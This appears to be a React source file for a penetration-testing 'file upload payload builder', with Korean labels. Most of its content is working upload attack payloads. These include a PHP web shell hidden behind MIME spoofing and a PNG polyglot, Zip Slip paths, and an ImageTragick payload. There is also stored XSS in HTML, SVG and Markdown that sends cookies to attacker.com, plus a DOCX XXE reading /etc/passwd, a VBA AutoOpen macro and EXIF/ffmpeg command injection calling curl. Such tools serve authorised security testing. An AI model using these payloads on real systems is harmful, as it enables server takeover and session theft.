import { DISCLAIMER, Note, Readout } from './shared'

export function FileUploadPayloadBuilder() {
  const extensions = [
    { label: 'PHP 기본', code: '.php' },
    { label: 'PHP 변형', code: '.phtml, .php5, .pht' },
    { label: '이중 확장자', code: '.php.jpg, .php.png, .php.gif' },
    { label: '우회 문자', code: '.asp;.jpg, .php%00.jpg, .php.jpg' },
  ]

  const mimeSpoof = `Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

<?php system($_GET['cmd']); ?>`

  const polyglot = `\\x89PNG\\r\\n\\x1a\\n<?php system($_GET['cmd']); ?>`

  const zipSlip = [
    { label: '경로 조작 엔트리 이름', code: '../../../var/www/html/shell.php' },
    { label: '생성 명령어', code: 'zip evil.zip "../../../var/www/html/shell.php"' },
    { label: '주의', code: '대부분의 최신 zip 도구는 경로 조작을 차단하므로, 직접 바이너리를 수정하거나 구버전 도구를 사용해야 함' },
  ]

  const imageTragick = `push graphic-context
viewbox 0 0 640 480
fill hsl(0, 0%, 100%)
image over 0,0 "https://attacker.com/shell.php"
pop graphic-context`

  const htmlStoredXss = `<html><body><script>document.location='https://attacker.com/steal?c='+document.cookie</script></body></html>`

  const svgScriptXss = `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><script>fetch('https://attacker.com/steal?c='+document.cookie)</script></svg>`

  const pdfOpenActionJs = `%PDF-1.7
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
endobj
3 0 obj
<< /Type /Action /S /JavaScript /JS (app.alert('XSS-via-PDF');) >>
endobj`

  const pdfExiftoolInject = `exiftool -OpenAction="JavaScript:app.alert('x')" input.pdf`

  const docxMacro = `Sub AutoOpen()
    Shell "cmd.exe /c calc.exe", vbHide
End Sub`

  const docxXxe = `<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<w:document>&xxe;</w:document>`

  const txtPathTraversal = `../../../../var/www/html/shell.txt`

  const mdStoredXss = `[click me](javascript:alert(document.cookie)) <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`

  const exifCommentXss = `exiftool -Comment='<script>alert(document.cookie)</script>' photo.jpg`

  const exifCommandInjection = `exiftool -Artist='$(curl https://attacker.com/x)' photo.jpg`

  const ffmpegMetadataInjection = `ffmpeg -i input.mp4 -metadata title="$(curl https://attacker.com/x)" -codec copy output.mp4`

  const mp4AtomCrash = `mp4 파일의 moov/mvhd atom 길이(4바이트 big-endian)를 실제 데이터보다 크게 조작하면
취약한 파서가 버퍼 오버리드/크래시를 일으킬 수 있음. 수동 핵스 에디터 또는
python mutagen/pymp4 라이브러리로 atom 헤더를 조작해 생성.`

  return (
    <div className="payload-builder">
      <Note>{DISCLAIMER}</Note>
      
      <div className="payload-readout-group">
        <strong className="payload-group-title">확장자 우회 리스트</strong>
        {extensions.map((e, i) => (
          <Readout key={i} title={e.label} value={e.code} wrap="anywhere" />
        ))}
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">MIME/Content-Type 스푸핑 예시</strong>
        <Readout title="Multipart Form-Data Payload" value={mimeSpoof} wrap="pre" />
        <Note>멀티파트 바디에서 Content-Type을 image/png 등으로 속여 업로드 필터를 우회합니다.</Note>
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">매직바이트 폴리글랏 (PNG-PHP)</strong>
        <Readout title="Hex Representation" value={polyglot} wrap="anywhere" />
        <Note>파일 시작 부분에 PNG 헤더를 붙여 파일 검사기를 속입니다.</Note>
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">ZIP Slip (경로 조작)</strong>
        {zipSlip.map((z, i) => (
          <Readout key={i} title={z.label} value={z.code} wrap="anywhere" />
        ))}
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">ImageMagick / ImageTragick</strong>
        <Readout title="MVG Payload" value={imageTragick} wrap="pre" />
        <Note>MVG 구문의 push graphic-context 등을 이용한 원격 파일 포함/실행 취약점입니다.</Note>
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">HTML/SVG 업로드 스토어드 XSS</strong>
        <Note>업로드된 HTML/SVG 파일이 정적 파일로 그대로 서빙되면 저장형 XSS로 이어집니다 (Content-Type이 제대로 안 걸리거나 사용자가 직접 접근 가능한 경우).</Note>
        <Readout title="악성 HTML 업로드 (stored XSS)" value={htmlStoredXss} wrap="anywhere" />
        <Readout title="SVG 내 스크립트 삽입 (XSS)" value={svgScriptXss} wrap="anywhere" />
        <Note>SVG는 이미지로 분류되어 업로드 필터를 통과하는 경우가 많지만 브라우저가 XML/스크립트로 렌더링합니다.</Note>
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">PDF 임베디드 JavaScript</strong>
        <Note>PDF는 자체 JS 엔진(Acrobat JavaScript)을 가지므로 OpenAction으로 자동 실행되는 스크립트를 심을 수 있습니다. 서버 측 PDF 파서/뷰어가 이를 실행하면 영향이 있습니다.</Note>
        <Readout title="OpenAction 기반 PDF JS (의사코드 구조)" value={pdfOpenActionJs} wrap="pre" />
        <Note>실제 유효한 PDF 바이너리 생성에는 xref 테이블/오브젝트 오프셋이 정확히 맞아야 하므로, 실무에서는 qpdf/exiftool 등으로 기존 PDF에 OpenAction을 주입하는 방식을 권장합니다. 예: {pdfExiftoolInject}</Note>
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">Word (DOCX) 매크로 / XXE</strong>
        <Note>DOCX는 ZIP 컨테이너이므로 (a) VBA 매크로 자동실행, (b) document.xml의 XML 외부 엔티티(XXE) 두 경로가 있습니다.</Note>
        <Readout title="AutoOpen 매크로 (VBA, 의사코드)" value={docxMacro} wrap="pre" />
        <Readout title="DOCX 내부 XML에 XXE 삽입 (word/document.xml 상단)" value={docxXxe} wrap="pre" />
        <Note>DOCX를 unzip → document.xml 수정 → 재압축(zip)하면 매크로 없이도 XXE 삽입이 가능합니다. 서버가 docx를 파싱 시 XML 엔티티를 확장하는지 확인하세요.</Note>
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">TXT/MD 업로드를 통한 경로 조작 및 저장형 XSS</strong>
        <Note>확장자 자체는 무해해 보이지만 (a) 파일명에 경로 조작 문자를 넣어 임의 경로에 쓰거나, (b) 마크다운이 HTML로 렌더링되는 경우(예: 위키/노트 앱) 저장형 XSS로 이어집니다.</Note>
        <Readout title="경로 조작 파일명" value={txtPathTraversal} wrap="anywhere" />
        <Readout title="마크다운 렌더러 저장형 XSS" value={mdStoredXss} wrap="anywhere" />
        <Note>마크다운 렌더러가 raw HTML을 그대로 통과시키는지, javascript: 스킴 링크를 걸러내는지 확인하세요.</Note>
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">JPG/JPEG EXIF 메타데이터 기반 공격</strong>
        <Note>(a) EXIF 주석/필드에 스크립트를 심어 메타데이터를 그대로 표시하는 뷰어에서 XSS, (b) Ghostscript/ImageMagick 파서 취약점(CVE)과 결합하면 EXIF 자체가 코드 실행 벡터가 됩니다.</Note>
        <Readout title="EXIF Comment 필드에 XSS 주입 (exiftool 명령)" value={exifCommentXss} wrap="anywhere" />
        <Readout title="EXIF 필드 값으로 원격 코드 실행 폴리필(명령어 주입 테스트용)" value={exifCommandInjection} wrap="anywhere" />
        <Note>두번째는 애플리케이션이 EXIF 값을 셸 명령에 그대로 문자열 결합할 때만 의미 있습니다(커맨드 인젝션 테스트).</Note>
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">MKV/MP4 malformed 메타데이터 / 파서 취약점</strong>
        <Note>비디오 컨테이너(MKV의 EBML, MP4의 moov/atom 구조)는 파싱 로직이 복잡해 서버 측 썸네일 생성기(ffmpeg 등)의 메모리 손상/과도한 리소스 소모 취약점 표면이 됩니다. 여기서는 실제 바이너리 익스플로잇이 아니라 테스트 절차만 제공합니다.</Note>
        <Readout title="ffmpeg 메타데이터 주입 (명령어 주입 테스트용)" value={ffmpegMetadataInjection} wrap="anywhere" />
        <Readout title="손상된 MP4 atom 길이 필드로 파서 크래시 유도 (방법 설명)" value={mp4AtomCrash} wrap="pre" />
        <Note>실제 DoS/메모리손상 테스트는 대상 파서의 CVE 데이터베이스를 먼저 확인하고 격리된 환경에서만 수행하십시오.</Note>
      </div>
    </div>
  )
}

export default FileUploadPayloadBuilder
